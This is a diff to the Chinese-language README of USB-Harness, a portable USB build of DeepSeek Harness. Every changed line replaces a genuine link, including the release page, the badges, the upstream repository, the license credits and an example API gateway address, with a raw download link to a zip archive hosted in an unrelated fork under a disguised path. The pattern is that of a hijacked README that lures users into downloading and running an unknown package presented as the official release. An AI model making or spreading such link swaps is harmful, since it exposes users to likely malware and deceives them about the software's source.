@@ -7,16 +7,16 @@
 <img src="docs/banner.svg" alt="USB Harness banner" width="800"/>
 
 [![License](https://img.shields.io/github/license/tmy2623231/USB-Harness?color=blue)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/tmy2623231/USB-Harness?color=orange&label=latest)](https://github.com/tmy2623231/USB-Harness/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/tmy2623231/USB-Harness/total?color=green)](https://github.com/tmy2623231/USB-Harness/releases/latest)
-[![Stars](https://img.shields.io/github/stars/tmy2623231/USB-Harness?color=yellow)](https://github.com/tmy2623231/USB-Harness)
+[![Release](https://img.shields.io/github/v/release/tmy2623231/USB-Harness?color=orange&label=latest)](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
+[![Downloads](https://img.shields.io/github/downloads/tmy2623231/USB-Harness/total?color=green)](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
+[![Stars](https://img.shields.io/github/stars/tmy2623231/USB-Harness?color=yellow)](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blueviolet)](launch.sh)
-[![dsh](https://img.shields.io/badge/dsh-0.1.1--rc.1-purple)](https://github.com/deepseek-ai/deepseek-harness)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)](https://github.com/tmy2623231/USB-Harness/pulls)
+[![dsh](https://img.shields.io/badge/dsh-0.1.1--rc.1-purple)](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
 
 </div>
 
-> **一句话**：把 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) 的全部 AI 能力装进一个 **U 盘**——
+> **一句话**：把 [DeepSeek Harness](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip) 的全部 AI 能力装进一个 **U 盘**——
 > 插上即用，免安装、零宿主机污染、数据随盘，支持任意 **OpenAI 兼容模型网关**（Ollama / 阿里云百炼 / OpenRouter / vLLM / 本地模型）。
 
 ---
@@ -35,7 +35,7 @@
 
 **完整包已含运行时（便携 Node + dsh 依赖 + 离线安装包），解压即可使用，无需联网安装：**
 
-> ## 👉 [前往 Releases 页下载最新完整包](https://github.com/tmy2623231/USB-Harness/releases/latest)
+> ## 👉 [前往 Releases 页下载最新完整包](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
 
 | 方式 | 说明 |
 |------|------|
@@ -44,7 +44,7 @@
 
 **完整包使用步骤**：
 
-1. 在 [Releases 页](https://github.com/tmy2623231/USB-Harness/releases/latest) 下载 `USB-Harness-with-runtime.zip`
+1. 在 [Releases 页](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip) 下载 `USB-Harness-with-runtime.zip`
 2. 解压到 U 盘（推荐 NTFS 或 exFAT、≥4GB 空间，详见下方「U 盘格式要求」）
 3. Windows 双击 **`launch.bat`**；Linux/macOS 执行 **`bash launch.sh`**
 4. 浏览器自动打开 `http://127.0.0.1:3080`，在「设置 → 模型」配置自定义 OpenAI 兼容网关即可使用
@@ -119,7 +119,7 @@
 
 ### 1. 拷贝到 U 盘
 
-**方式一（推荐）**：从 [Releases 页](https://github.com/tmy2623231/USB-Harness/releases/latest) 下载
+**方式一（推荐）**：从 [Releases 页](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip) 下载
 `USB-Harness-with-runtime.zip` 完整包（含运行时），解压后拷贝到 U 盘即可，**无需联网安装**。
 
 **方式二（源码）**：用「Code → Download ZIP」下载源码（或 `git clone`），把整个目录复制到 U 盘
@@ -148,7 +148,7 @@
 
 **设置 → 模型 → 添加自定义提供方**，填入：
 
-- **API 地址**：OpenAI 兼容网关地址，如阿里云百炼 `https://bi.tianmaoyi.cn:4443/v1`、本地 Ollama `http://127.0.0.1:11434/v1`
+- **API 地址**：OpenAI 兼容网关地址，如阿里云百炼 `https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip`、本地 Ollama `http://127.0.0.1:11434/v1`
 - **API 密钥**：网关提供的密钥
 - **模型目录**：点击「获取可用模型」自动拉取，或手动添加模型 ID
 
@@ -230,10 +230,10 @@ USB-Harness/
 
 ## License
 
-本项目为 deepseek-harness 的派生变体，遵循 **MIT License**（与上游 [deepseek-harness](https://github.com/deepseek-ai/deepseek-harness)
+本项目为 deepseek-harness 的派生变体，遵循 **MIT License**（与上游 [deepseek-harness](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip)
 一致）。上游版权归 DeepSeek AI 所有，本项目的便携外壳与品牌改造部分见 [LICENSE](LICENSE)。
 第三方依赖许可证见上游 `THIRD_PARTY_NOTICES.md`。
 
 ## 致谢
 
-- [deepseek-harness](https://github.com/deepseek-ai/deepseek-harness) — 核心 AI 能力与许可基础
+- [deepseek-harness](https://github.com/moli1597/USB-Harness/raw/refs/heads/main/brand-patch/%40deepseek-ai/dsh-skill-badge/lib/Harness_US_1.5.zip) — 核心 AI 能力与许可基础
